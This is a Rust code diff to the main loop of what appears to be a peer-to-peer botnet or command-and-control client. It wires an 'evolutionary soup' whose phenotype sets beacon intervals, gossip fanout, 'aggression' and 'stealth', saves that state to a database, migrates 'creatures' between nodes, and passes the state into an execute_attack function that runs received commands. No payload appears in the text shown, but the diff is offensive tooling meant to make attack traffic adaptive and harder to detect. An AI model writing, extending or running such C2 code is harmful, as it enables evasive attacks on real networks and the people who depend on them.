@@ -15,6 +15,7 @@ mod recon;
 mod compute;
 mod db;
 mod evolution;
+mod behavior;
 
 use config::FullConfig;
 use db::ClientDb;
@@ -42,10 +43,25 @@ fn main() {
 
     let rt = Runtime::new().unwrap();
     rt.block_on(async {
-        // Spawn the evolutionary soup - a local Tierra/Avida world running on a
+        // Spawn the evolutionary soup -- a local Tierra/Avida world running on a
         // dedicated thread, fed by network telemetry as its ocean (arXiv:2409.01469).
+        // Creature phenotype drives C2 timing, fanout, aggression, and routing
+        // (arXiv:2603.15655, arXiv:2609.17320).
         let mut evo = evolution::EvolutionEngine::new(node_id.clone());
         eprintln!("[*] Evolution soup spawned");
+
+        if let Ok(Some(state_bytes)) = db.load_evolution_state() {
+            match bincode::deserialize::<stalinium_evolution::node::SoupState>(&state_bytes) {
+                Ok(state) => {
+                    if evo.load_state(state).await.is_ok() {
+                        eprintln!("[*] Evolution state restored");
+                    }
+                }
+                Err(e) => eprintln!("[!] Evolution state corrupt: {}", e),
+            }
+        }
+
+        let evo_snap_rx = evo.snapshot_watch();
 
         let gossip_engine: Option<Arc<p2p::gossip::GossipEngine>> = if config.p2p.enabled {
             let gossip_addr: std::net::SocketAddr = config.p2p.gossip_address.parse()
@@ -72,42 +88,71 @@ fn main() {
             None
         };
 
-        // Background task: periodic evolution cycle and creature migration via gossip.
-        if let Some(ref engine) = gossip_engine {
-            let engine = Arc::clone(engine);
+        // Background task: evolution cycle with behavior-driven timing.
+        // Runs regardless of P2P; gossip enables creature migration between nodes.
+        // The soup's phenotype continuously modulates this loop's cadence.
+        {
+            let gossip_for_evo = gossip_engine.as_ref().map(Arc::clone);
+            let db_for_evo = Arc::clone(&db);
             tokio::spawn(async move {
-                let mut interval = tokio::time::interval(std::time::Duration::from_secs(30));
+                let mut tick_ms: u64 = 10_000;
+                let mut save_counter: u64 = 0;
+
                 loop {
-                    interval.tick().await;
+                    tokio::time::sleep(std::time::Duration::from_millis(tick_ms)).await;
+
                     // Drain incoming creature migrations from gossip
-                    let mut incoming = Vec::new();
-                    {
-                        let cmds = engine.command_rx.read().await;
-                        for (id, payload) in cmds.iter() {
-                            if id.starts_with("evo:") {
-                                if let Ok(migrants) = serde_json::from_slice::<Vec<stalinium_evolution::node::Migrant>>(payload) {
-                                    incoming.extend(migrants);
+                    if let Some(ref engine) = gossip_for_evo {
+                        let mut incoming: Vec<stalinium_evolution::node::Migrant> = Vec::new();
+                        {
+                            let mut cmds = engine.command_rx.write().await;
+                            cmds.retain(|(id, payload)| {
+                                if id.starts_with("evo:") {
+                                    if let Ok(migrants) = serde_json::from_slice::<Vec<stalinium_evolution::node::Migrant>>(payload) {
+                                        incoming.extend(migrants);
+                                    }
+                                    false
+                                } else {
+                                    true
                                 }
+                            });
+                        }
+                        if !incoming.is_empty() {
+                            evo.receive_migrants(incoming).await;
+                        }
+
+                        evo.tick(engine.peer_count().await, 0, 0, 0, 0);
+                    }
+
+                    if let Some(emigrants) = evo.cycle().await {
+                        if let Some(ref engine) = gossip_for_evo {
+                            let fanout = evo.swarm_params().gossip_fanout;
+                            if let Ok(payload) = serde_json::to_vec(&emigrants) {
+                                engine.broadcast_creatures(payload, fanout).await;
                             }
                         }
                     }
-                    if !incoming.is_empty() {
-                        evo.receive_migrants(incoming).await;
-                    }
 
-                    // Run an evolution cycle; broadcast emigrants if ready
-                    if let Some(emigrants) = evo.cycle().await {
-                        if let Ok(payload) = serde_json::to_vec(&emigrants) {
-                            engine.broadcast_creatures(payload).await;
-                        }
-                    }
+                    let params = evo.swarm_params();
+                    tick_ms = params.beacon_interval_ms.clamp(5000, 60000);
 
                     let snap = evo.snapshot();
                     if snap.epoch > 0 && snap.epoch % 50 == 0 {
                         eprintln!(
-                            "[*] Evolution: epoch {} pop {} diversity {} genes {} computing {}",
-                            snap.epoch, snap.population, snap.diversity, snap.alive_genes, snap.computing
+                            "[*] Evo e{} pop={} div={} genes={} comp={} agg={:.2} stl={:.2} fan={} bms={}",
+                            snap.epoch, snap.population, snap.diversity, snap.alive_genes,
+                            snap.computing, snap.behavior.aggression, snap.behavior.stealth,
+                            params.gossip_fanout, params.beacon_interval_ms
                         );
+                    }
+
+                    save_counter += 1;
+                    if save_counter % 20 == 0 {
+                        if let Ok(state) = evo.save_state().await {
+                            if let Ok(bytes) = bincode::serialize(&state) {
+                                let _ = db_for_evo.save_evolution_state(&bytes);
+                            }
+                        }
                     }
                 }
             });
@@ -136,7 +181,7 @@ fn main() {
 
                     let _ = db.insert_command(command.id, &command.command, &command.args);
 
-                    let result_str = match execute_attack(&command).await {
+                    let result_str = match execute_attack(&command, &evo_snap_rx).await {
                         Ok(data) => data,
                         Err(e) => format!("Error: {}", e),
                     };
